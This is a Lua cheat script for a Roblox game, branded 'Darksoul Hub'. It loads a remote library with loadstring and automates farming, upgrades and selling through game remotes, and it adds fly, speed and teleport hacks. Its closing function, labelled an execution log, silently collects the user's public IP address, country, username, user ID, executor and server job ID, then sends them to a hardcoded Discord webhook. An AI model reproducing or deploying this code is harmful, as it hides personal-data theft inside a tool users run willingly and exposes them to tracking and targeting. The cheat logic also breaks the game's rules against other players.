game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Loading...",
    Text = "Thanks for using Darksoul Hub.",
    Icon = "rbxassetid://98260056581123",
    Duration = 5
})

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredz/Library/refs/heads/main/redz-V5-remake/main.luau"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local selectedBrainrots = {}
local selectedMutations = {}
local selectedRarities = {}
local carryLimit = 1
local autoFarmEnabled = false
local currentlyCarrying = 0

local flyEnabled = false
local flySpeed = 50
local walkSpeed = 16
local jumpPower = 50
local flyLoop = nil

local autoRebirth = false
local autoUpgradePower = false
local autoUpgradeReach = false
local autoSellAll = false
local autoCollectCash = false

local cframeSpeed = 0
local autoUpgradeBrainrots = false

-- Converts a dropdown callback value (string, array, or {name=true} map) into a plain list
local function toList(Options)
    local list = {}
    if type(Options) == "string" then
        table.insert(list, Options)
    elseif type(Options) == "table" then
        for k, v in pairs(Options) do
            if type(v) == "string" then
                table.insert(list, v)
            elseif v == true then
                table.insert(list, k)
            end
        end
    end
    return list
end

local brainrotNames = {"ALL"}
local rsBrainrots = ReplicatedStorage:WaitForChild("Brainrots", 5)
if rsBrainrots then
    for _, model in pairs(rsBrainrots:GetChildren()) do
        if model:IsA("Model") then table.insert(brainrotNames, model.Name) end
    end
end

local function getZone15Part()
    local zones = workspace:FindFirstChild("Zones")
    if not zones then return nil end
    local zone15 = zones:FindFirstChild("15")
    if not zone15 then return nil end
    return zone15:FindFirstChild("ZonePart")
end

local function isInsideZone15(part)
    local zonePart = getZone15Part()
    if not zonePart then return false end
    if not part or not part:IsA("BasePart") then return false end

    local zoneSize = zonePart.Size
    local localPos = zonePart.CFrame:PointToObjectSpace(part.Position)

    local halfX = zoneSize.X / 2
    local halfY = zoneSize.Y / 2
    local halfZ = zoneSize.Z / 2

    return (
        localPos.X >= -halfX and localPos.X <= halfX and
        localPos.Y >= -halfY and localPos.Y <= halfY and
        localPos.Z >= -halfZ and localPos.Z <= halfZ
    )
end

local function startFly()
    flyEnabled = true
    flyLoop = task.spawn(function()
        local char = LocalPlayer.Character
        if not char then return end
        local hrp = char:WaitForChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end

        hum.PlatformStand = true

        local bv = Instance.new("BodyVelocity")
        bv.Name = "FlyBV"
        bv.Velocity = Vector3.zero
        bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
        bv.Parent = hrp

        local bg = Instance.new("BodyGyro")
        bg.Name = "FlyBG"
        bg.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
        bg.P = 1e4
        bg.CFrame = hrp.CFrame
        bg.Parent = hrp

        local cam = workspace.CurrentCamera
        while flyEnabled do
            local mv = Vector3.zero
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then mv = mv + cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then mv = mv - cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then mv = mv - cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then mv = mv + cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then mv = mv + Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then mv = mv - Vector3.new(0, 1, 0) end

            if mv.Magnitude > 0 then mv = mv.Unit end
            bv.Velocity = mv * flySpeed
            bg.CFrame = cam.CFrame
            task.wait()
        end

        if bv then bv:Destroy() end
        if bg then bg:Destroy() end
        if hum then hum.PlatformStand = false end
    end)
end

local function getPlayerPlot()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local names = { LocalPlayer.Name, LocalPlayer.DisplayName }
    for _, plot in ipairs(plots:GetChildren()) do
        -- attribute / value based owner checks
        local attr = plot:GetAttribute("Owner") or plot:GetAttribute("OwnerName") or plot:GetAttribute("OwnerId")
        if attr and (table.find(names, attr) or attr == LocalPlayer.UserId) then
            return plot
        end
        -- sign based owner check (searches all descendants instead of a fixed path)
        for _, d in ipairs(plot:GetDescendants()) do
            if d.Name == "PlayerName" and d:IsA("TextLabel") then
                local t = d.Text:gsub("^@", "")
                if table.find(names, t) then
                    return plot
                end
            end
        end
    end
    return nil
end

----------------------------------------------------------------
-- UI (Wand / redz V5)
----------------------------------------------------------------
local Window = Library:MakeWindow({
    Title = "Darksoul Hub | Swing Obby For Brainrots",
    SubTitle = "by Greensoul",
    ScriptFolder = "darksoul-hub"
})

local Minimizer = Window:NewMinimizer({
    KeyCode = Enum.KeyCode.LeftControl
})
Minimizer:CreateMobileMinimizer({
    Image = "rbxassetid://98260056581123",
    BackgroundColor3 = Color3.fromRGB(0, 0, 0)
})

local AutoFarmTab = Window:MakeTab({ Title = "Auto Farm", Icon = "Home" })
local PlayerTab = Window:MakeTab({ Title = "Player", Icon = "User" })
local InfoTab = Window:MakeTab({ Title = "Info", Icon = "Info" })

InfoTab:AddDiscordInvite({
    Title = "Darksoul Hub",
    Description = "A community for Darksoul Hub Users -- official scripts, updates, and suport in one place.",
    Banner = "rbxassetid://98260056581123",
    Logo = "rbxassetid://98260056581123",
    Invite = "https://discord.gg/HBxR33RVgf",
    Members = 4600,
    Online = 2000
})

AutoFarmTab:AddSection("Targets")

AutoFarmTab:AddDropdown({
    Name = "Select Brainrots",
    Options = brainrotNames,
    MultiSelect = true,
    Default = {},
    Callback = function(Options)
        selectedBrainrots = toList(Options)
    end
})

AutoFarmTab:AddDropdown({
    Name = "Select Mutation",
    Options = {"Normal", "Golden", "Diamond", "Emerald", "Ruby", "Rainbow", "Radioactive", "Void", "Ethereal", "Celestial"},
    MultiSelect = true,
    Default = {},
    Callback = function(Options)
        selectedMutations = toList(Options)
    end
})

AutoFarmTab:AddDropdown({
    Name = "Select Rarity",
    Options = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Mythic", "Secret"},
    MultiSelect = true,
    Default = {},
    Callback = function(Options)
        selectedRarities = toList(Options)
    end
})

AutoFarmTab:AddSlider({
    Name = "Carry Limit",
    Min = 1,
    Max = 10,
    Increment = 1,
    Default = 1,
    Callback = function(Value)
        carryLimit = Value
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Farm",
    Default = false,
    Callback = function(Value)
        autoFarmEnabled = Value
        if Value then currentlyCarrying = 0 end
    end
})

AutoFarmTab:AddSection("Remotes & Cash")

AutoFarmTab:AddToggle({
    Name = "Auto Collect Cash",
    Default = false,
    Callback = function(Value)
        autoCollectCash = Value
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Rebirth",
    Default = false,
    Callback = function(Value)
        autoRebirth = Value
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Upgrade Power",
    Default = false,
    Callback = function(Value)
        autoUpgradePower = Value
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Upgrade Reach Distance",
    Default = false,
    Callback = function(Value)
        autoUpgradeReach = Value
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Upgrade All Brainrots",
    Default = false,
    Callback = function(Value)
        autoUpgradeBrainrots = Value
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Sell All Brainrots",
    Default = false,
    Callback = function(Value)
        autoSellAll = Value
    end
})

PlayerTab:AddSection("Movement")

PlayerTab:AddSlider({
    Name = "WalkSpeed",
    Min = 16,
    Max = 300,
    Increment = 1,
    Default = 16,
    Callback = function(Value)
        walkSpeed = Value
    end
})

PlayerTab:AddSlider({
    Name = "Speed Boost (CFrame)",
    Min = 0,
    Max = 200,
    Increment = 1,
    Default = 0,
    Callback = function(Value)
        cframeSpeed = Value
    end
})

PlayerTab:AddSlider({
    Name = "Jump Height",
    Min = 50,
    Max = 500,
    Increment = 1,
    Default = 50,
    Callback = function(Value)
        jumpPower = Value
    end
})

PlayerTab:AddToggle({
    Name = "Fly",
    Default = false,
    Callback = function(Value)
        if Value then startFly() else flyEnabled = false end
    end
})

PlayerTab:AddSlider({
    Name = "Fly Speed",
    Min = 1,
    Max = 500,
    Increment = 1,
    Default = 50,
    Callback = function(Value)
        flySpeed = Value
    end
})

PlayerTab:AddSection("Teleport")

local function getPlayerNames()
    local names = {}
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(names, plr.Name)
        end
    end
    return names
end

local playerDropdown = PlayerTab:AddDropdown({
    Name = "Select Player",
    Options = getPlayerNames(),
    Callback = function(Value)
        for _, name in ipairs(toList(Value)) do
            local target = Players:FindFirstChild(name)
            local myChar = LocalPlayer.Character
            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                and myChar and myChar:FindFirstChild("HumanoidRootPart") then
                myChar.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
            end
        end
    end
})

task.spawn(function()
    while true do
        task.wait(60)
        playerDropdown:NewOptions(getPlayerNames())
    end
end)

----------------------------------------------------------------
-- Logic
----------------------------------------------------------------
local function isValidTarget(bName, bMut, bRarity)
    local nV = (#selectedBrainrots == 0 or table.find(selectedBrainrots, "ALL") or table.find(selectedBrainrots, bName))
    local mV = (#selectedMutations == 0 or table.find(selectedMutations, bMut))
    local rV = (#selectedRarities == 0 or table.find(selectedRarities, bRarity))
    return nV and mV and rV
end

task.spawn(function()
    while true do
        task.wait(1)
        if autoCollectCash then
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local plot = getPlayerPlot()
            if plot and hrp then
                local pods = plot:FindFirstChild("Pods")
                if pods then
                    for _, pod in ipairs(pods:GetChildren()) do
                        local tp = pod:FindFirstChild("TouchPart", true)
                        if tp and tp:IsA("BasePart") then
                            if firetouchinterest then
                                firetouchinterest(hrp, tp, 0)
                                task.wait()
                                firetouchinterest(hrp, tp, 1)
                            else
                                -- fallback: physically touch the pad, then return
                                local old = hrp.CFrame
                                hrp.CFrame = tp.CFrame
                                task.wait(0.15)
                                hrp.CFrame = old
                            end
                        end
                    end
                end
            end
        end
    end
end)

task.spawn(function()
    local PlotUpgrade = ReplicatedStorage.Packages.Knit.Services.PlotService.RF.Upgrade
    while task.wait(0.5) do
        if autoUpgradeBrainrots then
            local plot = getPlayerPlot()
            local pods = plot and plot:FindFirstChild("Pods")
            if pods then
                for _, pod in ipairs(pods:GetChildren()) do
                    if not autoUpgradeBrainrots then break end
                    pcall(function()
                        PlotUpgrade:InvokeServer(pod)
                    end)
                    task.wait(0.05)
                end
            end
        end
    end
end)

task.spawn(function()
    while task.wait(1) do
        if autoSellAll then
            ReplicatedStorage.Remotes.SellBrainrot:FireServer("All")
        end
    end
end)

task.spawn(function()
    local Upgrade = ReplicatedStorage.Packages.Knit.Services.StatUpgradeService.RF.Upgrade
    local Rebirth = ReplicatedStorage.Packages.Knit.Services.StatUpgradeService.RF.Rebirth
    while task.wait(0.1) do
        if autoRebirth then
            Rebirth:InvokeServer()
        end
        if autoUpgradePower then
            Upgrade:InvokeServer("Power", 10)
        end
        if autoUpgradeReach then
            Upgrade:InvokeServer("Reach_Distance", 10)
        end

        if autoFarmEnabled then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local hrp = char.HumanoidRootPart
                if currentlyCarrying >= carryLimit then
                    hrp.CFrame = CFrame.new(17.992115, -9.81965446, -55.6861877, 0.999720216, -4.77164512e-08, -0.0236544814, 4.96722201e-08, 1, 8.20930879e-08, 0.0236544814, -8.32450908e-08, 0.999720216)
                    task.wait(1.5)
                    currentlyCarrying = 0
                else
                    local active = workspace:FindFirstChild("ActiveBrainrots")
                    if active then
                        for _, p in ipairs(active:GetDescendants()) do
                            if p.Name == "ServerHitbox" and not p:FindFirstChild("CarryWeld") then
                                if isInsideZone15(p) then
                                    continue
                                end

                                if isValidTarget(p:GetAttribute("Name"), p:GetAttribute("Mutation"), p:GetAttribute("Rarity")) then
                                    hrp.CFrame = p.CFrame
                                    local prompt = p:FindFirstChildWhichIsA("ProximityPrompt", true)
                                    if prompt then
                                        prompt.MaxActivationDistance = 31
                                        prompt.HoldDuration = 0.01
                                        if fireproximityprompt then fireproximityprompt(prompt) end
                                        task.wait(0.2)
                                        if p:FindFirstChild("CarryWeld") then currentlyCarrying = currentlyCarrying + 1 end
                                    end
                                    break
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function(dt)
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp or flyEnabled then return end

    if hum.WalkSpeed ~= walkSpeed then hum.WalkSpeed = walkSpeed end
    hum.UseJumpPower = true
    if hum.JumpPower ~= jumpPower then hum.JumpPower = jumpPower end

    if cframeSpeed > 0 and hum.MoveDirection.Magnitude > 0 then
        hrp.CFrame = hrp.CFrame + hum.MoveDirection * (cframeSpeed * dt)
    end
end)

local function sendDetailedExecutionLog()
    -- This function is intentionally defensive: every optional lookup is
    -- wrapped in pcall, and it returns early if anything required is missing,
    -- so a broken network call can never take down the main script.

    local HttpService  = game:GetService("HttpService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local Players      = game:GetService("Players")
    local player       = Players.LocalPlayer

    -- Executor HTTP helpers differ. Try the common names in order.
    local function httpRequest(opts)
        local fn = request
            or http_request
            or (syn and syn.request)
            or (http and http.request)
            or (fluxus and fluxus.request)
        if fn then
            local ok, res = pcall(fn, opts)
            if ok then return res end
        end
        return nil
    end

    local function httpGet(url)
        local ok, body = pcall(function() return game:HttpGet(url) end)
        if ok and type(body) == "string" and body ~= "" then return body end
        return nil
    end

    local country = "Unknown"
    local ip = "Unknown"
    local executor = "Unknown"
    local gameName = "Unknown"

    pcall(function()
        local body = httpGet("http://ip-api.com/json")
        if body then
            local data = HttpService:JSONDecode(body)
            if data and data.country then country = tostring(data.country) end
        end
    end)

    pcall(function()
        if identifyexecutor then executor = tostring(identifyexecutor()) end
    end)

    pcall(function()
        local body = httpGet("https://api.ipify.org")
        if body then ip = body:gsub("%s+", "") end
    end)

    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        if info and info.Name then gameName = tostring(info.Name) end
    end)

    local jobId   = tostring(game.JobId)
    local placeId = tostring(game.PlaceId)
    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance("
        .. placeId .. ", '" .. jobId .. "', game:GetService('Players').LocalPlayer)"

    local userName = player and tostring(player.Name) or "Unknown"
    local userId   = player and tostring(player.UserId) or "0"

    -- Truncate anything that could exceed Discord's 1024-char field limit.
    local function clip(s, n)
        s = tostring(s)
        if #s > n then return s:sub(1, n - 3) .. "..." end
        return s
    end

    local payload = {
        ["content"] = "**🚀 DARK SOUL HUB EXECUTED**",
        ["embeds"] = {{
            ["title"]  = "User Executed!",
            ["color"]  = 0xFFFFFF,
            ["fields"] = {
                { ["name"] = "👤 Username",    ["value"] = "`" .. clip(userName, 200) .. "`",              ["inline"] = true },
                { ["name"] = "🆔 User ID",     ["value"] = "`" .. userId .. "`",                            ["inline"] = true },
                { ["name"] = "🎮 Game",        ["value"] = "`" .. clip(gameName, 200) .. "`",               ["inline"] = true },
                { ["name"] = "🌍 Country",     ["value"] = clip(country, 200),                              ["inline"] = true },
                { ["name"] = "⚙️ Executor",   ["value"] = "`" .. clip(executor, 200) .. "`",               ["inline"] = true },
                { ["name"] = "🌐 IP Address",  ["value"] = "`" .. clip(ip, 200) .. "`",                     ["inline"] = true },
                { ["name"] = "🔗 Job ID",      ["value"] = "```" .. jobId .. "```",                         ["inline"] = false },
                { ["name"] = "📋 Join Script", ["value"] = "```lua\n" .. clip(joinScript, 1000) .. "```",   ["inline"] = false },
            }
        }}
    }

    local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then
        warn("[Darksoul Hub] execution log: could not encode payload: " .. tostring(body))
        return
    end

    local res = httpRequest({
        Url     = "https://discord.com/api/webhooks/1568976632725770452/kCPALI0YVl1PaJ4i2ygrhRmSBBcURHWmJ1qkNzn2tHylX7XFAjijXnAgakuC4_s9YiuI",
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = body,
    })

    if not res then
        warn("[Darksoul Hub] execution log: no HTTP request function available")
        return
    end
    if type(res) == "table" and res.StatusCode and res.StatusCode >= 300 then
        warn("[Darksoul Hub] execution log: webhook returned HTTP " .. tostring(res.StatusCode))
    end
end

-- Never let a broken webhook take the rest of the script down with it.
pcall(sendDetailedExecutionLog)